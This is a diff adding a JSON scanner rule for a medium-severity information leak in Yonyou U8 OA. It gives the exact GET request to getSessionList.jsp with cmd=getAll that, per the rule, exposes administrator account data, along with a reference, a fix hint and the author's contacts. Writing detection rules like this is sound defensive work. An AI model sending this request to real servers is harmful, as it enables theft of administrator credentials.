@@ -1,0 +1,24 @@
+{
+    "vul_name": "用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞",
+    "level": "中危",
+    "description": "用友 U8 OA getSessionList.jsp文件，通过漏洞攻击者可以获取数据库中管理员的账户信息。",
+    "product": "用友 U8 OA",
+    "version": "用友 U8 OA",
+    "cve": "无",
+    "reference": "https://peiqi.wgpsec.org/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20OA%20getSessionList.jsp%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html",
+    "fixing": "限制接口权限或联系厂商修复",
+    "rule": {
+        "path": "/yyoa/ext/https/getSessionList.jsp?cmd=getAll",
+        "method": "GET",
+        "headers": "",
+        "body": "",
+        "status_code": "200",
+        "keywords": "0",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
